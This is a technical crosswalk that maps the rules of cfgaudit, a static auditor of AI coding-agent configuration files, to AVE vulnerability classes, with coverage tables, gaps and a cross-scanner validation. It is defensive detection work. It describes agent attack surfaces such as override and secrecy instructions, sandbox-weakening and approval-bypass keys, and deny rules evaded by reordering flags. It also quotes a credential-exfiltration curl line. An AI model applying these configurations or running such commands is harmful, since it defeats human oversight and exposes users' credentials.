# cfgaudit → AVE crosswalk

[cfgaudit](https://github.com/cfgaudit/cfgaudit) is a static auditor of committable AI-agent **configuration files** (Claude Code `settings.json` / `CLAUDE.md` / `.mcp.json` / hooks / plugins, and the cross-agent equivalents: Cursor, Copilot, Gemini, Codex, Devin, Zed, Continue, OpenCode, Kimi, Cline, Roo Code, qwen, Grok). It does not connect to running servers or observe runtime, so it maps only to AVE's `static_detection` records.

cfgaudit emits each rule's primary AVE id in its JSON and SARIF output (`AVEID` in JSON; `properties.ave_id` in SARIF). This crosswalk is the source of truth that mapping is kept in sync with. Full write-up: [`docs/cfgaudit-to-ave.md`](https://github.com/cfgaudit/cfgaudit/blob/main/docs/cfgaudit-to-ave.md).

## Versions

| | Version |
|---|---|
| cfgaudit | 1.20.0, read at the tag (`ad25f5a`) |
| AVE record set | 89 records (AVE-2026-00001 .. 00089), 61 of them `static_detection`, schema 1.3.0, read at `6914f60` |
| Bawbel Scanner (validation, below) | 1.3.0 |

## Coverage

cfgaudit has **123 rules** in total. **67 of them map onto 29 AVE behavioral classes.** It is a many-to-one mapping: several cfgaudit rules land on the same AVE class, because cfgaudit slices threats by config surface where AVE slices by behavior. For example, cfgaudit has five distinct secret-detection rules (a secret in `settings.json` env, in an MCP `env`/`headers` block, an entropy fallback, a Continue inline `apiKey`, a crypto signing key), and all five map to the single AVE class `AVE-2026-00047` (hardcoded credentials in component).

The other 56 rules have no AVE class: they check config surfaces AVE's skill and MCP-server records do not enumerate (see "Config surfaces beyond AVE's model" below).

**This revision spans cfgaudit v1.19.0 to v1.20.0.** v1.19.0 added no rule; v1.20.0 added seven, `CFG117` to `CFG123`.

- **Two new rules are mapped.** `CFG120` (an exfiltration directive written in prose) maps to `AVE-2026-00013`, PII exfiltration, a class new to this crosswalk. `CFG119` (payload markers in a script that an auto-run hook, folder-open task or MCP launch starts) maps to `AVE-2026-00057` as an imperfect fit, stated in the table.
- **One mapping is dropped.** `CFG052` no longer maps to `AVE-2026-00017`. Measured on Claude Code 2.1.316, an `mcpServers` block in `.claude/settings.json` is not loaded (`claude mcp list` and `claude mcp get` do not show it, and the settings reference has no such key), so there is no second source that could shadow a server name. The rule now reports that block, at `info`, as having no effect, and joins the "declared configuration that never loads" surface below.
- **Five new rules are unmapped.** `CFG117` (a key defined twice in a Claude Code settings file) extends the "declared configuration that never loads" surface. `CFG121`, `CFG122` and `CFG123` form a new surface, a committed file that takes the place of a tool the agent runs. `CFG118` (an agent-neutral policy deny that an agent can take only from user settings) is informational and has no behaviour of its own.

**The record set is unchanged at 89**, 61 of them `static_detection`. Schema 1.3.0 added the `merged` and `rejected` statuses; every record is `active`, and no title or class of a mapped record changed.

**Both sides are pinned by commit**, so the counts can be re-derived. The cfgaudit tree read is the `v1.20.0` tag itself.

## Rule mapping

| cfgaudit rule(s) | AVE id | Class | Notes |
|---|---|---|---|
| CFG113 | AVE-2026-00001 | metamorphic payload via external config fetch | instruction to fetch remote text and follow it as instructions |
| CFG024 | AVE-2026-00029 | homoglyph / Unicode obfuscation | hidden Unicode control chars in instruction text |
| CFG026 | AVE-2026-00007 | goal hijack | override / persona / authority instruction |
| CFG092 | AVE-2026-00007 | goal hijack | Kimi agent file `override: true` replaces the whole system prompt |
| CFG029 | AVE-2026-00021 | autonomous action without confirmation | instruction to bypass permission prompts |
| CFG030 | AVE-2026-00010 | covert instruction concealment | "don't tell the user" / secrecy directive |
| CFG032 | AVE-2026-00025 | conversation-history / role injection | pseudo-system tags, turn-boundary injection |
| CFG035 | AVE-2026-00011 | dynamic tool-call injection | instruction to configure or trust an MCP server |
| CFG031, CFG036, CFG037, CFG038 | AVE-2026-00003 | credential exfiltration | sensitive-path read, env dump, embedded exfil shell |
| CFG033, CFG072 | AVE-2026-00039 | covert-channel exfiltration | markdown-image sink, DNS-name exfil |
| CFG056 | AVE-2026-00058 | deceptive trigger / activation-scope | broad always-on skill trigger |
| CFG057, CFG119 | AVE-2026-00057 | obfuscated / encoded payload | base64 or data-URI encoded injection; CFG119 an obfuscated payload in a script an auto-run hook or task starts. Imperfect fit for CFG119: it also reports a download-and-run step with a credential hunt and no obfuscation, which no record covers |
| CFG120 | AVE-2026-00013 | PII exfiltration | an instruction in prose to send named sensitive data, or to send data unseen, to an outside address or URL; the shell form is CFG036 under AVE-2026-00003 |
| CFG081 | AVE-2026-00027 | multi-turn instruction persistence | "survive context compaction" directive |
| CFG051, CFG085 | AVE-2026-00048 | unsafe agent delegation chain | over-broad tool grant in agent frontmatter |
| CFG090 | AVE-2026-00032 | network reconnaissance instruction | scan or enumerate an internal network (see gaps re: precision) |
| CFG008, CFG014 | AVE-2026-00004 | shell-pipe code execution | reverse shell, `curl \| sh` |
| CFG039 | AVE-2026-00005 | recursive filesystem destruction | `rm -rf` |
| CFG027, CFG028 | AVE-2026-00008 | persistence / self-replication | cron/startup persistence, writing trust files |
| CFG007, CFG050, CFG054, CFG065, CFG073, CFG097 | AVE-2026-00047 | hardcoded credentials in component | secrets in settings or MCP env/headers; CFG097 adds a literal in a Gemini remote agent's `auth` block |
| CFG059 | AVE-2026-00017 | server impersonation / spoofing | MCP server name typosquat |
| CFG019, CFG020, CFG070 | AVE-2026-00055 | command exec via untrusted MCP launch config | inline-script, env-code, repo-relative launcher |
| CFG075 | AVE-2026-00061 | TLS verification disabled in config | `NODE_TLS_REJECT_UNAUTHORIZED=0`, `GIT_SSL_NO_VERIFY`, `--insecure` in MCP `env`/`args` |
| CFG010, CFG055, CFG074, CFG089, CFG098 | AVE-2026-00062 | unpinned dependency / supply-chain substitution | unpinned `@latest`/`:latest`, `skills-lock.json` with no integrity pin, marketplace source without a full-SHA pin; CFG098 adds a `marketplace.json` archive source with no `sha256` and an npm source at a non-default registry |
| CFG003, CFG004, CFG048, CFG053, CFG063, CFG079, CFG087, CFG091, CFG093, CFG096, CFG104, CFG105 | AVE-2026-00063 | approval gate bypassed by declarative config | `enableAllProjectMcpServers`, `defaultMode: bypassPermissions`, VS Code `chat.permissions.default`, blanket MCP-trust keys, Codex `approval_policy`/`approvals_reviewer`, `autoMode` classifier, a hook answering a permission gate, qwen `approvalMode: yolo`, Cursor allowlists, Gemini MCP `trust`, Devin `permissions.allow`, OpenCode `permission` |
| CFG047, CFG067, CFG086, CFG114 | AVE-2026-00064 | zero-click project-load auto-run | `.vscode/tasks.json` `runOn: folderOpen` and Zed `create_worktree` hook tasks, committed project hooks, zero-click hook events; CFG114 adds committed OpenCode `.opencode/plugin` and `.opencode/tool` code. CFG114 also reports committed Copilot CLI project extensions, at `info` only: those load after folder trust and behind an experimental flag, so they are not zero-click, but the rule emits one id |
| CFG082 | AVE-2026-00071 | container daemon redirected off-host | `DOCKER_HOST` in a `settings.json` or MCP `env`, or `docker -H` in a command site, naming a remote `tcp://`/`ssh://` daemon |
| CFG018 | AVE-2026-00072 | MCP server bound to every interface, no auth step | bind address `0.0.0.0` or `[::]` in an MCP server's `args`/`env`, which the record also calls NeighborJack |
| CFG005, CFG046, CFG071, CFG099 | AVE-2026-00073 | endpoint redirect via a static config value | `ANTHROPIC_BASE_URL` off Anthropic (CVE-2026-21852), `OTEL_EXPORTER_OTLP_*ENDPOINT` to a non-local collector, a model or provider base URL over cleartext `http://`, qwen top-level `proxy` |
| CFG094, CFG103 | AVE-2026-00076 | natural-language steering of an approval classifier | Cursor `.cursor/permissions.json` `autoRun.allow_instructions`; Codex `features.guardianv2.classifier_instructions`, which replaces the reviewer's prompt outright (that finding of CFG103 only) |

Mappings are class-level behavioral equivalence, not asserted identity. Where a cfgaudit rule covers more than one AVE class, only the canonical primary is emitted (matching AVE's one-`ruleId`-per-class SARIF model); the full multi-mapping is in cfgaudit's own crosswalk doc.

## Config surfaces beyond AVE's model

AVE's records enumerate behavior in skills and MCP servers. cfgaudit additionally audits config-file classes that carry no corresponding AVE behavioral class today.

Seven of the eight surfaces listed here at v1.10.0 have since been closed by AVE records: permission/approval config and the committed-hook auto-approve case by `AVE-2026-00063`, zero-click auto-run by `AVE-2026-00064`, TLS verification disabled by `AVE-2026-00061`, supply-chain pinning by `AVE-2026-00062`, container/daemon posture by `AVE-2026-00071`, MCP network posture by `AVE-2026-00072`, and telemetry/endpoint redirect by `AVE-2026-00073`. The natural-language-steering surface added in the last revision was closed by `AVE-2026-00076` in the same window. What remains:

| Config surface | Example files / keys | Example rules | Status |
|---|---|---|---|
| Sandbox weakening in config | four mechanisms, listed below | CFG022, CFG061, CFG064, CFG079, CFG095 | **the one still open** |
| Cleartext endpoint, distinct from TLS verification disabled | a committed `http://` MCP server URL, an A2A `agent_card_url` | CFG049, CFG097 | mostly closed by `AVE-2026-00073`, two fields reached only by its catch-all |
| Plugin auto-load from a committed manifest | Grok `[plugins]` `enabled` / `paths` | CFG100 | unmapped on purpose, see below |
| A guardrail that does not hold | a `deny` pattern walked past by flag reordering; an invisible character inside a permission rule or hook matcher | CFG101, CFG111 | probably outside AVE's model by construction |
| Two committed skills claiming one name | two `SKILL.md` files, load order decides | CFG102 | narrowed by `AVE-2026-00082`, not closed |
| An **automated** security reviewer switched off or blunted | Codex `[features.guardianv2]` `enabled`, `review_threshold` | CFG103 | `AVE-2026-00063` is a bypassed **human**-approval step |
| Repository grants browser or desktop-application access | Codex `[browser_use]` `full_cdp_access`, `[computer_use]` app access | CFG106 | not filed under `AVE-2026-00063` on purpose |
| A configuration-declared environment that loads code into every shell | Codex `shell_environment_policy.set`, Claude Code settings `env` with `BASH_ENV`, `LD_PRELOAD`, `NODE_OPTIONS` | CFG107, CFG110 | added at v1.14.0 (CFG107) and v1.15.0 (CFG110) |
| A committed scheduler that fires prompts on a timer | `.claude/scheduled_tasks.json` | CFG108 | added at v1.14.0 |
| A declared configuration that never loads | a Codex config that fails to parse, a Claude Code settings file the agent discards, a key defined twice, `mcpServers` in `settings.json` | CFG109, CFG012, CFG117, CFG052 | CFG109 added at v1.15.0, CFG012 older; CFG117 and CFG052 at v1.20.0 |
| A committed credential source sent to a committed endpoint | MCP `bearer_token_file` | CFG112 | added at v1.15.0 |
| A committed path that makes the agent read a file on the reader's machine | a config path that is a symbolic link leaving the repository; an `@~/...` or `../` import in `CLAUDE.md` | CFG115, CFG116 | CFG115 added at v1.17.1, CFG116 at v1.18.0 |
| A committed file that takes the place of a tool the agent runs | a nested bare repository with `core.fsmonitor`, `git.exe` at the root, a committed `.venv`, a `.yarnrc.yml` `yarnPath` | CFG121, CFG122, CFG123 | new |

### Sandbox weakening, the one surface still open

This is the last of the eight, and the reason it is still open is that the field list was in motion when it was last picked up ([#68](https://github.com/aveproject/ave/issues/68)). **It has since settled.** CFG064 reached its current shape in v1.12.0 and nothing further is queued against it. The mechanisms, which are four rather than one:

1. **The sandbox switched off outright.** Codex `sandbox_mode = "danger-full-access"`, Cursor `type: "insecure_none"`, Claude Code `sandbox.filesystem.disabled: true`.
2. **The sandbox left on but widened.** Codex `[sandbox_workspace_write]` `network_access = true` and `writable_roots` reaching outside the workspace; Gemini `tools.sandboxAllowedPaths` exposing `/` or `~`, and `tools.sandboxNetworkAccess: true`.
3. **The confinement helpers repointed.** Claude Code `sandbox.bwrapPath` and `sandbox.socatPath` (honored only from managed settings, so anomalous anywhere else), `sandbox.excludedCommands` carrying a wildcard or a shell, `sandbox.network.allowUnixSockets` naming a privileged daemon socket such as `docker.sock`, `sandbox.filesystem.allowWrite` on `$PATH` or a shell rc file.
4. **The same posture reached without touching a sandbox key at all.** Codex's named permission profiles: `default_permissions` selects a `[permissions.<name>]` profile whose `network` block carries `enabled`, `proxy_url`, `socks_url`, `dangerously_allow_all_unix_sockets` and `dangerously_allow_non_loopback_proxy`, and whose `filesystem` block can grant `":root"` or a credential path. `extends` genuinely inherits, so a profile cannot be judged from its own table. An indicator list keyed on `sandbox_mode` misses this fourth mechanism entirely.

**Is "widened" a different class from "off"?** Earlier read was maybe. After building it: no. Both are the same check, read a declared value and compare it to the default. The difference is blast radius, not kind. Mechanism 4 is the one that is genuinely different, because it reaches the same posture through a key with no "sandbox" in the name.

**The hardening-not-weakening trap, extended.** Beyond `disableTmpWrite`, `exclude_tmpdir_env_var` and `exclude_slash_tmp`, three more instances turned up while building v1.12.0, all measured: Grok's `[plugins] disabled` (naming a plugin to discover but not activate hardens); qwen's `memory.autoSkillConfirm`, whose default is **true**, so the weakening value there is `false`, the inverse of every `disable*` key; and Codex's profile `filesystem` block, where across 69 real `.codex/config.toml` files the decisions are `deny` 177, `write` 72, `read` 53, `none` 51, so the block's presence is overwhelmingly hardening and only a granting direction on a sensitive target is a finding. One more for an `indicators_of_compromise` list: a read grant on `~/.ssh/id_ed25519.pub` is not credential exposure, and a real profile in that corpus carries exactly that.

### Two gaps on Codex reviewer and access settings

**An automated reviewer switched off by config.** Codex's `[features.guardianv2]` decides whether its own security reviewer runs (`enabled`), at what score it escalates to a blocking review (`review_threshold`, default `0.5`, a number the reviewer's own prompt states), and what prompt it is given (`classifier_instructions`). The prompt half is `AVE-2026-00076` and is mapped above. The other two are not: `AVE-2026-00063` is explicitly a bypassed *human*-approval step, and Guardian v2 is an automated reviewer. `features` is not on Codex's project-layer denylist, so a committed `.codex/config.toml` sets all three; verified against codex `0.150.0-alpha.7` by reading the effective config back through its app server in a trusted directory, with a denylisted key and an ordinary key as controls.

**A repository granting browser or desktop access.** Codex's `[browser_use]` grants per-origin `access`, `downloads`, `uploads` and `full_cdp_access` (full Chrome DevTools Protocol, so script execution plus cookie and storage access inside the browser session), and `[computer_use]` grants control of desktop applications by bundle id, AUMID or executable. The value type is an enum of exactly `allow` and `deny`, so there is no ask state and `allow` is unambiguously the weakening direction. This is deliberately **not** filed under `AVE-2026-00063`: whether a prompt is skipped is unverified, because the value is observable in the effective config but the tools themselves live in the client app. Filing it there would assert more than the detection does.

### Four surfaces added in the previous revision (v1.14.0 to v1.16.0)

**A configuration-declared environment that loads code into every shell (CFG107 at v1.14.0, CFG110 at v1.15.0).** Codex `shell_environment_policy.set` and the Claude Code settings `env` block both set the process environment of every shell command and hook the agent starts, so `BASH_ENV`, `LD_PRELOAD`, `NODE_OPTIONS` and similar run repository-chosen code in each of them. Measured for Claude Code: a project-scope `env` value reaches the hook process. The mechanism is the one `AVE-2026-00055` describes, but that record is bound to an untrusted MCP launch config. Stretching it onto the agent's own process environment would change what it asserts, so this is reported as a gap.

**A committed scheduler that fires prompts on a timer (CFG108, v1.14.0).** A committed `.claude/scheduled_tasks.json` self-enables Claude Code's otherwise-off cron scheduler and enqueues a repository-authored prompt on a schedule. `AVE-2026-00063` is a bypassed human-approval gate; this bypasses no gate, it opens a new autonomous channel.

**A declared configuration that never loads (CFG109 at v1.15.0, and the discarded-file case of the older CFG012).** The repository states guardrails that are not in force, because the agent does not load the file. Measured in both directions: Codex logs `Invalid configuration; using defaults` and runs, and Claude Code silently discards a whole settings file, every deny rule and hook with it, on a top-level type error or on one unloadable `PreToolUse` or `PermissionRequest` hook entry. `AVE-2026-00083` is the nearest in effect, a protection that executes but never evaluates, but it is `runtime_observed` and scoped to a mechanism's own comparison logic.

**A committed credential source sent to a committed endpoint (CFG112, v1.15.0).** An MCP server's `bearer_token_file` names a file on the reader's machine whose content is sent as a bearer token to the server URL in the same committed file. `AVE-2026-00047` is a credential written into the component; here the file names where to read one and where to send it.

`CFG111` extends the "guardrail that does not hold" row: an invisible character such as a zero-width space inside a permission rule or hook matcher leaves the rule present and matching nothing. Like `CFG101`, it is an ineffective control rather than an attacker behaviour.

### The surface added in the previous revision (v1.17.1 and v1.18.0)

**A committed path that makes the agent read a file on the reader's machine (CFG115, CFG116).** `CFG115`: a committed config path (`.claude/settings.json`, `.mcp.json`, `CLAUDE.md`, a skill) is a symbolic link, or runs through a linked directory, that resolves outside the repository, so the agent loads a file from the machine that checked the repository out. `CFG116`: an `@path` import in a committed `CLAUDE.md`, `AGENTS.md` or `.claude/rules` file resolves outside the repository (`@~/...`, an absolute path elsewhere, `../` past the root). Measured with Claude Code 2.1.310, such an import is not loaded in print mode, and an interactive session loads it only after a once-per-project dialog that lists the files. In both cases the repository chooses which local file the agent reads. A reviewer sees the link or the import line, but not the content of the file it reaches. The nearest records do not cover this: `AVE-2026-00001` is a fetch from a remote source, `AVE-2026-00047` a credential written into the component, `AVE-2026-00053` a path traversal in an MCP tool's own path validation, and `AVE-2026-00089` a sandbox whose writable scope comes from a tool parameter (`runtime_observed`).

### Changes in this revision

**A declared configuration that never loads, extended (CFG117, CFG052).** `CFG117`: a key defined twice in one object of a Claude Code settings file, such as two top-level `"hooks"` or two `"deny"` under `permissions`. Measured on Claude Code 2.1.312 and 2.1.314, the last occurrence is kept and the earlier ones ignored, as `JSON.parse` does, so a hook or deny list a reviewer reads in the first copy is not in force. `AVE-2026-00075` (compiled bytecode that diverges from its reviewed source) has the same "what is reviewed is not what runs" shape on a different artifact and is not stretched onto a settings file. `CFG052`: an `mcpServers` block in `.claude/settings.json`, which Claude Code does not load, reported at `info`.

**A committed file that takes the place of a tool the agent runs (CFG121, CFG122, CFG123).** Coding agents run ordinary tools in the checkout on their own: `git status` after an edit, `git submodule update`, `node`, `python`, `yarn`. A committed file can take the tool's place:

- `CFG121`: a nested bare repository whose `config` sets a key git runs as a command (`core.fsmonitor`, `core.hooksPath`, `core.sshCommand`, a filter driver), so the agent's next git call there runs it; also an unencrypted or lookalike submodule URL in `.gitmodules`.
- `CFG123`: a Windows program named like a tool at the repository root (`git.exe`, `node.cmd`), which Windows runs from the current directory before `PATH`; a committed Python virtual environment; a `.yarnrc.yml` `yarnPath` that is not a Yarn release, which yarn runs as JavaScript on every command.
- `CFG122`: the same tool binaries and a `.git` entry inside an archive given as the scan target, which a clone of the repository never produces.

`AVE-2026-00055` is bound to an untrusted MCP launch config and `AVE-2026-00075` to a `.pyc` cache. Neither covers the agent's own tool call being redirected by a committed file.

### The three deliberately unmapped rules

- **CFG100**, Grok `[plugins]`. `AVE-2026-00064` would be the class, but it requires the loader to run plugin code at project load with no prompt. That is not verified against the shipped Grok build, so mapping it would assert a mechanism nobody measured.
- **CFG101**, a deny rule walked past by flag reordering. Claude Code matches a `Bash(...)` pattern as a literal prefix, so `Bash(rm -rf *)` never covered `rm -fr x`. Measured against Claude Code 2.1.231; about 44% of 22,016 indexed `settings.json` files with a `deny` block leave the gap open. `AVE-2026-00063` is a flag that removes a gate, `AVE-2026-00068` is composition through shell state. Neither is "the denylist misses an equivalent spelling". This is an ineffective control, not an attacker behavior, so it may be outside AVE's scope.
- **CFG102**, two committed skills claiming one name. `AVE-2026-00017` is the closest class but is explicitly MCP server identity, and `AVE-2026-00066` is registry squatting on hallucinated names. Neither covers two local files where load order decides which body runs. `AVE-2026-00082` (local skill name collision) is much closer, but it asserts that the shadowing is silent and that it spans discovery roots of differing trust. Measured for Claude Code, a duplicate inside one repository is resolved by qualification, not silently shadowed, and the cross-root case needs a machine-wide view a repository-scoped scanner does not have. What stays uncovered is the same-root collision, per agent, where the losing skill is never reported.

These are not gaps in this crosswalk. They are config classes outside AVE's current skill/MCP scope, listed so coverage stays visible in both directions.

## Cross-implementation validation (cfgaudit vs Bawbel Scanner)

To test whether the shared ids actually interoperate, cfgaudit **1.9.0** and [Bawbel Scanner](https://github.com/bawbel/scanner) **1.3.0**, which share no code and no ruleset and only the AVE taxonomy, were run on the same `SKILL.md` files using cfgaudit's canonical trigger text unmodified (not tuned for agreement). Static engines only (`pattern`+`yara`+`semgrep`, no LLM), both reading `ave_id` from JSON.

Of the 33 AVE-mapped rules cfgaudit had at that version, **10 instruction/skill-content rules share a scan surface with Bawbel's file scan** (the other 23 read command sites or config files Bawbel's file scan does not cover). Of those 10:

**Both scanners independently emit the same `ave_id` on 5 of the 10.**

| Rule | AVE | cfgaudit | Bawbel | |
|---|---|---|---|---|
| CFG024 | 00029 | yes | yes | agree |
| CFG026 | 00007 | yes | yes (+00002) | agree |
| CFG029 | 00021 | yes | yes | agree |
| CFG030 | 00010 | yes | yes (+00003) | agree |
| CFG090 | 00032 | yes | yes | agree |
| CFG031 | 00003 | yes | no | detection differs |
| CFG035 | 00011 | yes | no | detection differs |
| CFG036 | 00003 | yes | no | detection differs |
| CFG057 | 00057 | yes | no | detection differs |
| CFG081 | 00027 | yes | no | detection differs |

The 5 agreements are cross-implementation corroboration of the mapping. The 5 divergences are detection-pattern differences, not mapping errors: Bawbel bundles a rule for each class, but its pattern did not match cfgaudit's canonical trigger. For CFG036, for instance, Bawbel reports the `curl …?d=$(cat ~/.aws/credentials)` skill CLEAN while cfgaudit flags it. A shared id makes exactly these coverage differences visible and comparable, which is the point.

## Gaps

Static `static_detection` classes cfgaudit does not map, with the reason:

| AVE id | Gap |
|---|---|
| AVE-2026-00015 | system-prompt extraction. Maps to OWASP LLM07, which cfgaudit treats as runtime; the instruction is static, but the scope boundary is undecided. |
| AVE-2026-00036 | lateral movement. cfgaudit implemented and then reverted this rule after a false-positive analysis over 422 real instruction files: the vocabulary (`lateral movement`, `pivot to other systems`) is statically indistinguishable from security-tool self-description and defensive contexts. The reverted rule used the CFG091 id, which cfgaudit has since reused for the qwen approval-mode rule (mapped to AVE-2026-00021). |
| AVE-2026-00059 | fragmented cross-description injection. Needs multi-source correlation; cfgaudit checks each file in isolation, which is the exact property this attack defeats. |
| AVE-2026-00060 | STDIO transport shell injection. A server-side implementation flaw: it needs SAST of the MCP server's source, not a read of its launch configuration. Same layer as AVE-2026-00052 and AVE-2026-00053. |
| AVE-2026-00065 | A2A agent card poisoning. cfgaudit reaches the committed pointer but not the card. A `.gemini/agents/*.md` may carry an inline `agent_card_json`, which cfgaudit recognises well enough to classify the file as a remote agent, but it does not audit the card's contents. It does flag a cleartext `agent_card_url` and a credential literal in the same file's `auth` block (CFG097). |
| AVE-2026-00069 | Image-hidden instructions in a skill package. Needs binary content analysis of a bundled image; cfgaudit reads text configuration only. Same layer as AVE-2026-00024. |
| AVE-2026-00077 | Cross-origin tool and resource declaration in one MCP manifest. cfgaudit reads MCP *launch* configuration (`command`, `args`, `env`, `url`, `headers`), not the manifest a server returns once it is running, so the two declarations this record correlates are never both in view. |
| AVE-2026-00082 | Local skill name collision. Close to `CFG102`, which narrows that gap without closing it; see "The three deliberately unmapped rules". |
| AVE-2026-00084 | Lifecycle hook trust decoupling on plugin update. `static_detection`, but the detection is a diff against the last-reviewed plugin version, which a single repository snapshot cannot provide. cfgaudit's plugin rules (`CFG055` pinning, `CFG067` committed hooks) touch the committed half and are not remapped. |
| AVE-2026-00085 | Collusive cross-skill composition. Needs correlation across independently benign skills; cfgaudit checks each file in isolation. Same deferral as `AVE-2026-00059`. |
